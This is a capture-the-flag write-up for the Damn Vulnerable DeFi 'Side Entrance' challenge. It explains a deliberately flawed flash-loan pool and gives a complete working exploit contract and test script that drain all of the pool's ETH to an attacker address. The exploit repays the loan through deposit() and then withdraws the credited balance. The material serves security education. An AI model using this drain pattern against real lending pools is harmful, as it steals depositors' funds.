## 1) Challenge

> <cite>A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.</cite>
> <cite>This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.</cite>
> <cite>You must take all ETH from the lending pool. </cite>([link](https://www.damnvulnerabledefi.xyz/challenges/4.html))

Challenge created by [@tinchoabbate](https://twitter.com/tinchoabbate).


## 2) Code Review

There is only the contract `SideEntranceLenderPool` ([source code](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/side-entrance/SideEntranceLenderPool.sol)) that has three functions: `deposit`, `withdraw` and `flashLoan`:
- `deposit` is used to update the balance of the `msg.sender` with the amount deposited
- `withdraw` is used to send ETH (by calling the `sendValue` function - doc [here](https://docs.openzeppelin.com/contracts/2.x/api/utils#Address-sendValue-address-payable-uint256-)) to the `msg.sender` with the amount available, taken from the `balances` variable
- `flashLoan` is used to provide the loan. This function:
    - checks if the pool balance is `>=` than the amount requested (line `30`)
    - calls the `execute` function of a contract and sends the ETH amount requested (line `33`)
    - finally, it checks if the amount is paid it back (line `35`)

```solidity

contract SideEntranceLenderPool {
    using Address for address payable;

    mapping (address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");
        
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
    }
}

```

The `balances` variable is used to keep track of the balances of different addresses when calling `deposit` and `withdraw`.
Since the amount of token are sent to the `execute` function, we need to use a contract in order to interact with this function.

#### How to request a flash loan?

Let's build a simple example that uses this function that will request a loan equal to the whole pool balance i.e `1000 ETH` (challenge [setup](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/side-entrance/side-entrance.challenge.js#L17)).
What we need to do is: 
- define a function in our contract that will call the `flashLoan` function
- expose a payable function with name `execute` that will be called by the pool contract
- inside the `execute` function we can use the loan but we need to pay it back otherwise the condition at line `35` will fail. Since there are no `receive` or `fallaback` function to call in the pool contract, in order to send back the ETH, we need to call the `deposit` function since it's a payable function.

To see what happen, let's also keep track the value in the `balances` variable (you can add a debug log `console.log(balances[msg.sender]);` in the pool contract before and after the `execute` function at line `33` to see these values).

`AttackSideEntrance.sol`
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ILenderPool {
  function deposit() external payable;
  function flashLoan(uint256 amount) external;
  function withdraw() external;
}

/**
 * @title AttackSideEntrance
 */
contract AttackSideEntrance {

    ILenderPool pool;
    uint256 poolBalance;

    constructor(address _pool) {
        pool = ILenderPool(_pool);
        poolBalance = address(pool).balance;
    }

    function run() public {
      pool.flashLoan(poolBalance);
    }

    function execute() external payable {
      // we received 1000 ETH
      require(address(this).balance == poolBalance, "No enough ETH");

      // do something with the loan
      // ...

      // pay the loan back to the pool
      pool.deposit{value: msg.value}();
    }

}


```

We can call the `run` function with the following code:
```javascript

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        const attack = await(await ethers.getContractFactory('AttackSideEntrance', attacker)).deploy(this.pool.address);
        
        await attack.connect(attacker).run();

    });

```

The function succeded. Cool! Let's see what happened to the `balances` values.

Initially, the value for `balances[msg.sender]`, when the `msg.sender` is our contract, is of course `0` since we haven't deposited any amount of ETH.

After we have paid the loan back, the value for `balances[msg.sender]` for our contract will be `1000` ETH. 

**Why?** When requesting a loan of `1000` ETH, this amount is sent from the pool to our contract when calling the `execute` function (that is a payable function), so the ETH balance of our contract increased by `1000` ETH.
When we call the `deposit` function to pay the loan back, the `msg.value` will be equal to the amount requested, that is `1000` ETH. But since the `deposit` is a payable function, we return the ETH to the pool, so the balance of our contract is decreased by `1000` ETH. However, the value in the `balances` variable will be `1000` ETH for our contract.

At this point, we were able to change the value in the `balances` variable.

#### What happen when call the withdraw function?

As we have seen before, the `witdraw` function does the following: 
- get the `balances` amount for `msg.sender` 
- set the `balances[msg.sender]` to `0` (preventing reentracy because the value is updated before it is sent)
- sends the initial amount in `balances[msg.sender]` from the pool to `msg.sender` by calling `sendValue`

We have just seen, in our previuos example, that we were able to update the `balances` value for our contract with `1000` ETH amount.

So if we call the withdraw function from our contract, we receive `1000` ETH, taking all the ETH from the pool. In order to solve the challenge, we need to transfer these ETH from our contract to the attacker address.


## 3) Solution

Here is how the solution works:
1) our contact call the `flashLoan` function with an `amount` equal to the ETH pool balance (`1000` ETH)
2) the pool will call the `execute` function sending its entire ETH balance to our contact
3) inside the `execute` function, we can call the `deposit` function in order to update the `balances` variable for our contract
4) once the execution of the `flashLoan` is completed, we call the `withdraw` function in order to receive the ETH amount save in `balances`
5) the `withdraw` function will send send us the ETH by calling `sendValue`. We need to expose a `receive` payable function in order to recevied the ETH
6) finally, we send the ETH received to the attacker address

This is a visual representaion of the calls involved in the attack:
{{< image src="/images/side_entrance_picture.png" >}}

`AttackSideEntrance.sol`:
```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ILenderPool {
  function deposit() external payable;
  function flashLoan(uint256 amount) external;
  function withdraw() external;
}

/**
 * @title AttackSideEntrance
 */
contract AttackSideEntrance {

    ILenderPool pool;
    uint256 poolBalance;

    constructor(address _pool) {
        pool = ILenderPool(_pool);
        poolBalance = address(pool).balance;
    }

    function run(address _attacker) public {
      pool.flashLoan(poolBalance);

      pool.withdraw();
      
      (bool result,) = _attacker.call{value: poolBalance}("");

      require(result, "Something goes wrong");

    }

    function execute() external payable {
      require(address(this).balance == poolBalance, "No enough ETH");

      // do something with the loan
      // ...

      // pay the loan back to the pool
      pool.deposit{value: msg.value}();
    }

    // needed to receive ETH
    receive() external payable {}
}

```

`side-entrance.challenge.js`:

```javascript


    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const attack = await(await ethers.getContractFactory('AttackSideEntrance', attacker)).deploy(this.pool.address);
        
        await attack.connect(attacker).run(attacker.address);

    });
```

You can find the complete code [here](https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/test/side-entrance/side-entrance.challenge.js) and [here](https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/contracts/attacker-contracts/AttackSideEntrance.sol).

